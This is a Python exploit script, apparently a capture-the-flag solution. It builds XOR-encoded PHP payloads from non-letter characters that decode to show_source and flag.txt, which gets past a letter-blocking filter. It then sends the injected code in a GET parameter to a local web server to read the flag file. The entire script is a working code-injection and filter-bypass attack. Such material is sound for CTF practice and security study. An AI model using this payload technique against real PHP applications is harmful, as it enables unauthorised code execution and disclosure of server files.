import string 
import requests
def get_xor_strings(expected, valids):
    word1 = ""
    word2 = ""
    for i in expected:
        for valid in valids:
            result = chr(ord(i) ^ ord(valid))
            if result in valids:
                word1 += result
                word2 += valid
                break
    return word1, word2

def xor(s1, s2):
    res = []
    for i,j in zip(s1, s2):
        res.append(chr(ord(i) ^ ord(j)))
    return ''.join(res)


valids = []
for s in string.printable:
    if(s not in string.ascii_letters):
        valids.append(s)

valids=valids[:len(valids) - 3]
print("[+] Generated valids => {}".format(valids))

expected = "show_source"
word1, word2 = get_xor_strings(expected, valids)
print("[+] Word 1 {} - Word2 {}".format(word1, word2))

result = xor(word1, word2)

print("[+] Verifying ... Should be {} => {}".format(expected, result))

expected="flag.txt"
word3, word4 = get_xor_strings(expected, valids)
print("[+] Word3 {} - Word4 {}".format(word3, word4))
result = xor(word3, word4)
print("[+] Verifying ... Should be {} => {}".format(expected, result))
payload = "(\"{}\"^\"{}\")(\"{}\"^\"{}\");".format(word1,word2,word3,word4)

print("[+] Payload {}".format(payload))

params = {
    "warmup" : payload
}
resp = requests.get("http://localhost", params=params)
print(resp.content.decode())